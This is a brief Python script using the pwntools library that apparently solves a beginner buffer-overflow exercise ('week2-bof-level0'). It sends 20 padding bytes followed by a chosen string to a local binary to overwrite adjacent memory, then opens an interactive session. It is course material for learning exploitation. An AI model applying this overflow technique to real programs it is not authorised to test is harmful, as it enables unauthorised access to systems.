# week2-bof-level0
#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./bof-level0")

print(p.recv())

# send data with newline
p.sendline("A"*20 + "ABCDEFGH")

# open an interactive console to the program
p.interactive()
